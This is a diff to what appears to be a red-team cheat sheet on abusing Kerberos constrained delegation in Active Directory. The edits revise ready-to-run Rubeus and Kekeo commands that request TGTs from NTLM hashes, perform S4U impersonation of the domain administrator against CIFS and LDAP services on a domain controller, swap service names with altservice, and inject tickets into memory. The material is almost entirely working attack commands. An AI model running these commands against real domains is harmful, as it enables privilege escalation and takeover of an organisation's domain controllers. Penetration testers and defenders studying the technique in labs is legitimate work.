@@ -733,7 +733,7 @@ Or using ActiveDirectory module:
 
 ```./Rubeus.exe asktgt /domain:ecorp.lab /user:webadmin /rc4:cbdc389e6f34c671fadb1b13edbc5a61 /outfile:C:\Temp\webtgt.kirbi```
 
-#### Using S4U and the previous TGT, request a TGS:
+#### Using S4U and the previous TGT, request a delegated TGS by specifying the msDS-AllowedToDelegateTo Service:
 
 Kekeo:
 ```
@@ -757,7 +757,7 @@ Example:
 ```Rubeus.exe tgtdeleg```
 https://github.com/GhostPack/Rubeus#tgtdeleg
 
-```Rubeus.exe s4u /ticket: /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt```
+```Rubeus.exe s4u /ticket: /impersonateuser:administrator /domain:ecorp.lab /msdsspn:cifs/dc01.ecorp.lab /dc:dc01.ecorp.lab /ptt```
 
 ```klist```
 
@@ -768,10 +768,8 @@ We could also just do it all in one command - Rubeus does all the steps for us!
 _in possession of constrained delegation machine account NTLM hash:_
 
 ```
-Rubeus.exe s4u /user:WEBSRV01$ /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:WAdmin /ptt
+Rubeus.exe s4u /user:WEBSRV01$ /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:WAdmin /msdsspn:cifs/dc01.ecorp.lab /ptt
 ```
-
-
 
 **"If a ```/user``` and ```rc4/aes256``` hash is supplied, the ```s4u``` module performs an ```asktgt``` action first, using the returned ticket for the steps following. If a TGT ```/ticket:X``` is supplied, that TGT is used instead."**
 -https://github.com/GhostPack/Rubeus#s4u
@@ -780,16 +778,18 @@ Rubeus.exe s4u /user:WEBSRV01$ /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonat
 
 There is also a possiblity of requesting a TGS for more services than is specified in {msDS-AllowedToDelegateTo} IF there is no SNAME validation:
 
-
 ```
 Rubeus.exe s4u /ticket:adminsrv$_LOCALxxx.kirbi /impersonateuser:Administrator /domain:ecorp.lab /msdsspn:cifs/dc01.ecorp.lab|ldap/dc01.ecorp.lab
 ```
 
-**NOTE:** You then save both to disk or output-String, and import the one you want to impersonate i.e., LDAP OR inject straight into memory the altservice-
+**NOTE:** You then save both to disk or output-String, and import the one you want to impersonate i.e., LDAP OR inject straight into memory the altservice
 
+**NOTE:** This will ONLY work if the msdspn service FQDN is able to be used by both i.e., NOT ending in a port e.g., ```CE01/SQLDatabase.ecorp.lab:1337``` - this will NOT work!
 ```
-.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt
+.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/dc01.ecorp.com /altservice:CIFS /ptt
 ```
+
+
 * * * 
 
 Inject PTT:
